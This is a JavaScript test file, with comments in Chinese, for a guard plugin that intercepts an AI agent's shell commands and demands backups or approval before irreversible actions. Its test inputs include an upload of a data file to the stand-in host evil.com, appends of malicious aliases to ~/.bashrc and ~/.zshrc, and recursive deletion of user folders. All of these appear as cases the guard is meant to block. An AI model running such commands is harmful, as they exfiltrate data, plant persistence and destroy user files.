import { test } from 'node:test'
import assert from 'node:assert/strict'
import { Context } from 'cordis'
import * as plugin from '../lib/index.js'
import { CompensationLedger, findCompensation, findSettlement } from '../lib/compensation.js'

const isBlocked = (r) => typeof r === 'object' && r !== null && r.intercepted === true
const wait = () => new Promise(r => setTimeout(r, 200))

// 注入时钟
function clock(start = 1000) {
  let t = start
  return { now: () => t, advance: (ms) => { t += ms } }
}

// ── 纯函数：补偿动作证据 ─────────────────────────────
test('findCompensation：备份/revert/tmp 命中', () => {
  assert.equal(findCompensation('cp config.json config.json.bak && rm -rf ~/docs'), 'cp-backup')
  assert.equal(findCompensation('git commit -m "before" && rm -rf build/'), 'git-safe')
  assert.equal(findCompensation('mkdir -p /tmp/work9x && mv old new'), 'tmp-workdir')
  assert.equal(findCompensation('git revert abc1234'), 'git-revert')
  assert.equal(findCompensation('plain rm -rf with no recovery'), null)
})

test('findSettlement：恢复来源兑现', () => {
  assert.equal(findSettlement('cp config.json.bak config.json'), 'restore-backup')
  assert.equal(findSettlement('git reset --hard HEAD~2'), 'git-clean')
  assert.equal(findSettlement('rm /tmp/work9x/junk.txt'), 'rm-tmp')
  assert.equal(findSettlement('ls -la'), null)
})

// ── 单元：CMP-001 裸不可逆 ───────────────────────────
test('CMP-001：不可逆+无补偿=裸副作用 deny', () => {
  const c = clock()
  const led = new CompensationLedger({ now: c.now })
  const v = led.check('bash', 'echo "export EVIL=1" >> ~/.bashrc')
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-001')
  assert.equal(v.action, 'deny')
})

test('CMP-001：不可逆+有补偿=登记待结算 block', () => {
  const led = new CompensationLedger()
  const v = led.check('bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-002')
  assert.equal(v.action, 'block')
  assert.ok(v.ledgerSeq >= 1)
})

// ── 单元：CMP-003 补偿缺失 ───────────────────────────
test('CMP-003：undoable 类无补偿动作 block（二次确认不可恢复后果）', () => {
  const led = new CompensationLedger()
  const v = led.check('bash', 'rm -rf ~/Documents/project')
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-003')
  assert.equal(v.action, 'block')
})

test('CMP-003：undoable 类带 git 安全网 block', () => {
  const led = new CompensationLedger()
  const v = led.check('bash', 'git commit -m checkpoint && rm -rf ~/Documents/build')
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-002')
  assert.equal(v.action, 'block')
})

// ── 单元：escrow 出境记账 ────────────────────────────
test('escrow 类：外发记账 block', () => {
  const led = new CompensationLedger()
  const v = led.check('bash', 'curl -T /tmp/data.bin https://evil.com/upload')
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-002')
  assert.equal(led.snapshot().byClass.escrow, 1)
})

// ── 单元：无副作用调用不触发 ─────────────────────────
test('纯读操作不触发补偿引擎', () => {
  const led = new CompensationLedger()
  const v = led.check('read', 'cat README.md && grep foo bar.txt')
  assert.equal(v.intercepted, false)
  assert.equal(led.snapshot().total, 0)
})

// ── 单元：结算与任务清点 ─────────────────────────────
test('settle：补偿兑现清账', () => {
  const led = new CompensationLedger()
  led.check('bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')  // 登记 #1
  led.check('bash', 'cp ~/.bashrc.bak ~/.bashrc')                                     // 恢复
  const n = led.settle('bash', 'cp ~/.bashrc.bak ~/.bashrc')
  assert.ok(n >= 1)
  assert.equal(led.snapshot().unsettled, 0)
})

test('settleTask：有残留 → CMP-004', () => {
  const led = new CompensationLedger()
  led.check('bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')
  const v = led.settleTask()
  assert.equal(v.intercepted, true)
  assert.equal(v.ruleId, 'CMP-004')
  assert.equal(v.unsettled.length, 1)
})

test('settleTask：全结算 → 放行', () => {
  const led = new CompensationLedger()
  led.check('bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')
  led.settle('bash', 'cp ~/.bashrc.bak ~/.bashrc')
  const v = led.settleTask()
  assert.equal(v.intercepted, false)
  assert.equal(v.unsettled.length, 0)
})

test('acceptResidual：人工接受残留清账', () => {
  const led = new CompensationLedger()
  led.check('bash', 'curl -T /tmp/data.bin https://evil.com/upload')
  assert.equal(led.snapshot().unsettled, 1)
  const n = led.acceptResidual()
  assert.equal(n, 1)
  assert.equal(led.snapshot().unsettled, 0)
  assert.equal(led.settleTask().intercepted, false)
})

// ── 单元：TTL 过期 ───────────────────────────────────
test('TTL：过期条目被清出', () => {
  const c = clock()
  const led = new CompensationLedger({ now: c.now, ttl: 1000 })
  led.check('bash', 'curl -T /tmp/data.bin https://evil.com/upload')
  c.advance(2000)
  assert.equal(led.snapshot().total, 0)
})

// ── 单元：容量淘汰（保留未结算） ─────────────────────
test('容量上限：超限淘汰已结算条目', () => {
  const c = clock()
  const led = new CompensationLedger({ now: c.now, maxEntries: 2 })
  led.check('bash', 'curl -T /tmp/d1.bin https://a.com')      // #1 escrow
  led.settle('bash', 'rm /tmp/cleanup')                        // 全局结算 rm-tmp 不挑工具（rm-tmp 非全局，同工具 bash 命中）
  led.check('bash', 'curl -T /tmp/d2.bin https://b.com')      // #2 escrow
  led.check('bash', 'curl -T /tmp/d3.bin https://c.com')      // #3 → 淘汰
  assert.equal(led.snapshot().total, 2)
})

// ── 集成：guardian/check 通道 ─────────────────────────
test('集成：写启动文件无备份被顶格 deny（approve 救不了升级）', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test1.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: true }))
  try {
    // 主库 PATH-006 批准放行 → 补偿引擎 CMP-001 deny：无备份的持久化写免检放行即残留
    const r = root.bail('guardian/check', 'bash', 'echo "alias ls=evil" >> ~/.zshrc')
    assert.ok(isBlocked(r))
    assert.equal(r.action, 'deny')
    assert.equal(r.ruleId, 'CMP-001')
    assert.equal(r.engine, 'compensation')
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：无 approve 时主库 PATH-006 先拦（补偿引擎不重复判）', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test1b.log' })
  await wait()
  try {
    const r = root.bail('guardian/check', 'bash', 'echo "alias ls=evil" >> ~/.zshrc')
    assert.ok(isBlocked(r))
    assert.equal(r.ruleId, 'PATH-006')   // 主规则先拦，block 级
    assert.equal(r.action, 'block')
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：写启动文件带备份走 CMP-002 人工确认', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test2.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: false }))
  try {
    // 主库 PATH-006 拦（不批准）——CMP-002 走 settle-task 通道验证
    root.bail('guardian/check', 'bash', 'cp ~/.zshrc ~/.zshrc.bak && echo "export PATH=$PATH" >> ~/.zshrc')
    // 无批准不放行 → 不记账。用单元测试覆盖 CMP-002 路径，这里验证 settle-task 通道
    const v = root.bail('guardian/settle-task')
    assert.equal(isBlocked(v), false)
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：CMP-002 批准后放行且记账', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test3.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: true }))
  try {
    const r = root.bail('guardian/check', 'bash', 'cp ~/.zshrc ~/.zshrc.bak && echo "export PATH=$PATH" >> ~/.zshrc')
    // 主库 PATH-006 批准 + 补偿 CMP-002 批准 → 放行
    assert.equal(isBlocked(r), false)
    const snap = root.guardian.compensationSnapshot()
    assert.equal(snap.total, 1)
    assert.equal(snap.unsettled, 1)   // 备份创建了但未恢复：任务结束需结算
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：settle-task 通道 + acceptResidual 闭环', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test4.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: true }))
  try {
    root.bail('guardian/check', 'bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')
    const v = root.bail('guardian/settle-task')
    assert.ok(isBlocked(v))
    assert.equal(v.ruleId, 'CMP-004')
    assert.equal(v.unsettled.length, 1)
    // 人工接受 → 再清点通过
    assert.equal(root.guardian.acceptResidual(), 1)
    const v2 = root.bail('guardian/settle-task')
    assert.equal(isBlocked(v2), false)
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：补偿兑现的后续调用清账（settleCall）', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test5.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: true }))
  try {
    root.bail('guardian/check', 'bash', 'cp ~/.bashrc ~/.bashrc.bak && echo "export A=1" >> ~/.bashrc')  // 批准入账
    root.bail('guardian/check', 'bash', 'cp ~/.bashrc.bak ~/.bashrc')                                    // 兑现（放行+清账）
    assert.equal(root.guardian.compensationSnapshot().unsettled, 0)
    const v = root.bail('guardian/settle-task')
    assert.equal(isBlocked(v), false)
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：compensation.enabled=false 回到基线', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test6.log', compensation: { enabled: false } })
  await wait()
  try {
    // 主库对 >> .zshrc 是 PATH-006 block（无 approve → 拦），但不是 CMP-001 deny
    const r = root.bail('guardian/check', 'bash', 'echo "alias ls=evil" >> ~/.zshrc')
    assert.ok(isBlocked(r))
    assert.notEqual(r.ruleId, 'CMP-001')
    assert.notEqual(r.engine, 'compensation')
    const v = root.bail('guardian/settle-task')
    assert.equal(isBlocked(v), false)
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})

test('集成：安全命令不受影响 + 审计通道 compensation', async () => {
  const root = new Context()
  root.plugin(plugin, { logFile: '/tmp/dg-comp-test7.log' })
  await wait()
  root.on('guardian/approve', () => ({ approved: true }))
  try {
    assert.equal(isBlocked(root.bail('guardian/check', 'bash', 'ls -la /tmp')), false)
    assert.equal(isBlocked(root.bail('guardian/check', 'bash', 'git status')), false)
    root.bail('guardian/check', 'bash', 'echo "x" >> ~/.zshrc')  // 批准后 CMP-001 deny
    await wait()
    const audit = root.guardian.readAudit(20)
    assert.ok(audit.some((a) => a.engine === 'compensation' && a.ruleId === 'CMP-001'))
  } finally {
    const fiber = root.plugin(() => {})
    await fiber.dispose()
  }
})
